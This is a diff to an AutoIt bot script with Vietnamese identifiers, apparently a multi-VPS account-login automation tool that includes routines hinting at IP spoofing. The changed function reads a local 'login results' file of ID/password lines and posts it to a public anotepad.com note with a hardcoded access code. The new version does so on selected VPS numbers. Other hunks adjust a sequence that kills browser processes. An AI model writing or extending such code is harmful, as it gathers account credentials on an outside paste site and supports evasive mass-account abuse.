@@ -13,7 +13,7 @@
 #include <String.au3>
 #include <FileConstants.au3>
 Opt("SendKeyDelay",30)
-$phienban='1.0.33'
+$phienban='1.0.34'
 #cs
 _caidatOmni()
  _FakeIPPC()
@@ -2237,9 +2237,12 @@ EndFunc
 
 		Next
 
-		    $dataIP=FileRead(@ScriptDir&'\KetQuaDangNhap.txt')
-			_postdataIP($dataIP,'https://anotepad.com/note/access/6tfiaiej','https://anotepad.com/notes/6tfiaiej')
+		If $vpsso=1 Or $vpsso=6 Or $vpsso=11 Or $vpsso=16 Or $vpsso=21 Or $vpsso=26 Or $vpsso=31 Or $vpsso=36 Or $vpsso=41 Or $vpsso=46 Or $vpsso=51 Or $vpsso=56 Or $vpsso=61 Or $vpsso=66 Or $vpsso=71 Or $vpsso=76 Or $vpsso=81 Or $vpsso=86 Or $vpsso=91 Or $vpsso=96 Then
 
+		     $dataIP=FileRead(@ScriptDir&'\KetQuaDangNhap.txt')
+			 _postdataIPGmail($dataIP,'https://anotepad.com/note/access/6tfiaiej','https://anotepad.com/notes/6tfiaiej')
+
+		EndIf
 
 		Return 	$check4
 
@@ -6221,7 +6224,7 @@ EndFunc
 				Sleep(100)
 				ProcessClose('firefox.exe')
 				Sleep(100)
-				ProcessClose('firefox.exe')
+				ProcessClose('firefox.exe - Bad Image')
 				Sleep(100)
 				ProcessClose('BingChatInstaller.exe')
 				Sleep(100)
@@ -6356,7 +6359,7 @@ EndFunc
 				Sleep(100)
 				ProcessClose('brave.exe')
 				Sleep(100)
-				ProcessClose('brave.exe')
+				ProcessClose('firefox.exe - Bad Image')
 				Sleep(100)
 				ProcessClose('browser_assistant.exe')
 				Sleep(100)
@@ -7797,33 +7800,46 @@ EndFunc
             $kq2=_HttpRequest(1,$url2,$datalogin2,$cookie2,$ref2,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
         EndFunc
 
-        Func _postdataIP($dataIP,$linkketqua,$linkdulieu)                                            ; gui IP len anotebad.com
+        Func _postdataIPGmail($dataIP,$linkketqua,$linkdulieu)                                            ; gui IP len anotebad.com
 			FileDelete(@ScriptDir&'\testdata.txt')
 			FileDelete(@ScriptDir&'\testdata2.txt')
 			Sleep(500)
-            _requetanotepad($linkdulieu,'testdata.txt')
-			Sleep(500)
-			FileWriteLine(@ScriptDir&'\testdata.txt',$dataIP)
-			Sleep(500)
-			$sodog=_FileCountLines(@ScriptDir&'\testdata.txt')
-			For $i20=1 to $sodog
-				$IdPass=FileReadLine(@ScriptDir&'\testdata.txt',$i20)
-				If StringLen($IdPass)>10 Then FileWriteLine(@ScriptDir&'\testdata2.txt',$IdPass)
-			Next
-			Sleep(100)
-			$dataIP2=FileRead(@ScriptDir&'\testdata2.txt')
-			;$dataIP=_bigdataIP($dataIP)
-			$ref=$linkketqua
-			$url=$linkketqua
-			$code=StringRight($linkketqua,8)
-			$datalogin='postback=true&accesscode=123456'
-			$cookie=''
-            $kq=_HttpRequest(1,$url,$datalogin,$cookie,$ref,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
-            $url2='https://anotepad.com/note/quickeditsave'
-            $ref2='https://anotepad.com/note/quickedit/'&$code
-            $datalogin2='number='&$code&'&notecontent='&$dataIP2
-            $cookie2=''
-            $kq2=_HttpRequest(1,$url2,$datalogin2,$cookie2,$ref2,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
+
+                _requetanotepad($linkdulieu,'testdata.txt')
+			    Sleep(500)
+				$sodong=_FileCountLines(@ScriptDir&'\testdata.txt')
+				If $sodong<10 Then
+					FileDelete(@ScriptDir&'\testdata.txt')
+					Sleep(50000)
+					_requetanotepad($linkdulieu,'testdata.txt')
+			        Sleep(500)
+				EndIf
+
+			$sodong=_FileCountLines(@ScriptDir&'\testdata.txt')
+
+			If $sodong<10 Then
+			    FileWriteLine(@ScriptDir&'\testdata.txt',$dataIP)
+			    Sleep(500)
+			    $sodog=_FileCountLines(@ScriptDir&'\testdata.txt')
+			    For $i20=1 to $sodog
+				    $IdPass=FileReadLine(@ScriptDir&'\testdata.txt',$i20)
+				    If StringLen($IdPass)>10 Then FileWriteLine(@ScriptDir&'\testdata2.txt',$IdPass)
+			    Next
+			    Sleep(100)
+			    $dataIP2=FileRead(@ScriptDir&'\testdata2.txt')
+			    ;$dataIP=_bigdataIP($dataIP)
+			    $ref=$linkketqua
+			    $url=$linkketqua
+			    $code=StringRight($linkketqua,8)
+			    $datalogin='postback=true&accesscode=123456'
+			    $cookie=''
+                $kq=_HttpRequest(1,$url,$datalogin,$cookie,$ref,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
+                $url2='https://anotepad.com/note/quickeditsave'
+                $ref2='https://anotepad.com/note/quickedit/'&$code
+                $datalogin2='number='&$code&'&notecontent='&$dataIP2
+                $cookie2=''
+                $kq2=_HttpRequest(1,$url2,$datalogin2,$cookie2,$ref2,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
+			EndIf
         EndFunc
 
 
